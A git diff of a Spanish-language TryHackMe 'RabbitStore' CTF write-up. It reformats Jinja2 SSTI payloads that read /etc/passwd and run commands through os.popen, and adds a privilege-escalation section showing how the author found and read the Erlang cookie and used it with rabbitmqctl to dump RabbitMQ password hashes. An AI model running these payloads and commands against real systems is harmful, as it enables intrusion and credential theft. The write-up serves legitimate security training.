@@ -441,7 +441,11 @@ Esto confirma una vulnerabilidad SSTI: envié {{7*7}} y la plantilla lo evaluó,
 
 En este punto probé un payload para leer /etc/passwd, el cual funcionó correctamente.
 
-Payload: `{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}`
+Payload:
+
+```bash
+{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}`
+```
 
 `NOTA:` En JSON, las comillas dobles dentro de una cadena deben ir escapadas (`\"`).
 
@@ -449,7 +453,9 @@ Payload: `{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").r
 
 Intenté buscar llaves RSA de SSH para los usuarios azrael y root, pero no encontré ninguna, por lo que ejecuté un payload para ejecutar comandos.
 
-`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
+```bash
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
 
 ![](/assets/images/thm-writeup-RabbitStore/id.png)
 
@@ -503,3 +509,202 @@ azrael@forge:~/chatbotServer$ export SHELL=bash
 azrael@forge:~/chatbotServer$ 
 ```
 ## Escalada de Privilegios
+
+Enumerando los procesos con pspy, vi un proceso que valida cuánto espacio en disco queda disponible en el directorio donde RabbitMQ guarda su base de datos.
+
+![](/assets/images/thm-writeup-RabbitStore/ps.png)
+
+En el `/etc/passwd` hay un usuario que se llama`rabbitmq`
+
+```bash
+azrael@forge:/tmp$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+azrael:x:1000:1000:KLI:/home/azrael:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+rtkit:x:114:118:RealtimeKit,,,:/proc:/usr/sbin/nologin
+epmd:x:115:119::/var/run/epmd:/usr/sbin/nologin
+geoclue:x:117:122::/var/lib/geoclue:/usr/sbin/nologin
+avahi:x:118:124:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+cups-pk-helper:x:119:125:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
+saned:x:120:126::/var/lib/saned:/usr/sbin/nologin
+colord:x:121:127:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+gdm:x:123:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
+rabbitmq:x:124:131:RabbitMQ messaging server,,,:/var/lib/rabbitmq:/usr/sbin/nologin
+```
+RabbitMQ es un software de colas de mensajes donde se definen colas a las que se conectan las aplicaciones para transferir uno o más mensajes. Para explotarlo seguí el sig. enlace [Pentesting Erlang Port Mapper Daemon (epmd)](https://book.hacktricks.wiki/en/network-services-pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd.html#erlang-cookie-rce)
+Básicamente debe encontrarse la cookie de autenticación para poder ejecutar código en el host, por lo regular suele estar en el **home** del usuario que corre Erlang/OTP: `~/.erlang.cookie`, sin embargo para encontrarla use el sig. comando:
+
+```bash
+find / -name ".erlang.cookie" -type f -print -exec ls -l {} \; 2>/dev/null
+ ```
+
+```bash
+azrael@forge:/$ find / -name ".erlang.cookie" -type f -print -exec ls -l {} \; 2>/dev/null
+
+/var/lib/rabbitmq/.erlang.cookie
+-r-----r-- 1 rabbitmq rabbitmq 16 Oct  6 23:17 /var/lib/rabbitmq/.erlang.cookie
+azrael@forge:/$ 
+```
+Ahora que conozco la ruta de la cookie, puedo ver su contenido.
+
+```bash
+azrael@forge:~/chatbotServer$ cat /var/lib/rabbitmq/.erlang.cookie; echo
+Z4l1ZmrrOY0kgNZS
+azrael@forge:~/chatbotServer$ 
+```
+Usando esta cookie puedo autenticarme y comunicarme con el nodo RabbitMQ. Los nodos RabbitMQ usan el formato rabbit@hostname, así que añadí forge a mi archivo /etc/hosts.
+
+```bash
+azrael@forge:~/chatbotServer$ HOME=/ erl -sname p3rr1n -setcookie Z4l1ZmrrOY0kgNZS
+Erlang/OTP 24 [erts-12.2.1] [source] [64-bit] [smp:2:2] [ds:2:2:10] [async-threads:1] [jit]
+
+Eshell V12.2.1  (abort with ^G)
+(p3rr1n@forge)1>
+```
+Posteriormente use la herramienta rabbitmqctl y la cookie  para ver el estado del nodo
+
+```bash
+┌──(root㉿kali)-[/home/kali]
+└─# rabbitmqctl --erlang-cookie 'Z4l1ZmrrOY0kgNZS' --node rabbit@forge status
+Status of node rabbit@forge ...
+[]
+Runtime
+
+OS PID: 1239
+OS: Linux
+Uptime (seconds): 4564
+Is under maintenance?: false
+RabbitMQ version: 3.9.13
+RabbitMQ release series support status: see https://www.rabbitmq.com/release-information
+Node name: rabbit@forge
+Erlang configuration: Erlang/OTP 24 [erts-12.2.1] [source] [64-bit] [smp:2:2] [ds:2:2:10] [async-threads:1] [jit]
+Crypto library: 
+Erlang processes: 371 used, 1048576 limit
+Scheduler run queue: 1
+Cluster heartbeat timeout (net_ticktime): 60
+...SNIP...
+```
+Luego enumeré los usuarios y me encontré con una nota interesante.
+
+```bash
+┌──(root㉿kali)-[/home/kali]
+└─#  rabbitmqctl --erlang-cookie 'Z4l1ZmrrOY0kgNZS' --node rabbit@forge list_users
+Listing users ...
+user    tags
+The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.      []
+root    [administrator]
+```
+
+Para obtener el hash ejecute el siguiente comando:
+
+```bash
+┌──(root㉿kali)-[/home/kali]
+└─# rabbitmqctl --erlang-cookie 'Z4l1ZmrrOY0kgNZS' --node rabbit@forge export_definitions /tmp/rabbit_defs.json --format json 
+Exporting definitions in JSON to a file at "/tmp/rabbit_defs.json" ...
+                       
+┌──(root㉿kali)-[/home/kali]
+└─# cat /tmp/rabbit_defs.json | jq
+{
+  "bindings": [],
+  "permissions": [
+    {
+      "configure": ".*",
+      "read": ".*",
+      "user": "root",
+      "vhost": "/",
+      "write": ".*"
+    }
+  ],
+  "queues": [
+    {
+      "arguments": {},
+      "auto_delete": false,
+      "durable": true,
+      "name": "tasks",
+      "type": "classic",
+      "vhost": "/"
+    }
+  ],
+  "parameters": [],
+  "policies": [],
+  "rabbitmq_version": "3.9.13",
+  "exchanges": [],
+  "global_parameters": [
+    {
+      "name": "cluster_name",
+      "value": "rabbit@forge"
+    }
+  ],
+  "rabbit_version": "3.9.13",
+  "topic_permissions": [
+    {
+      "exchange": "",
+      "read": ".*",
+      "user": "root",
+      "vhost": "/",
+      "write": ".*"
+    }
+  ],
+  "users": [
+    {
+      "hashing_algorithm": "rabbit_password_hashing_sha256",
+      "limits": {},
+      "name": "The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.",                                                                                                  
+      "password_hash": "vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K",
+      "tags": []
+    },
+    {
+      "hashing_algorithm": "rabbit_password_hashing_sha256",
+      "limits": {},
+      "name": "root",
+      "password_hash": "49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF",
+      "tags": [
+        "administrator"
+      ]
+    }
+  ],
+  "vhosts": [
+    {
+      "limits": [],
+      "metadata": {
+        "description": "Default virtual host",
+        "tags": []
+      },
+      "name": "/"
+    }
+  ]
+}
+       
+```
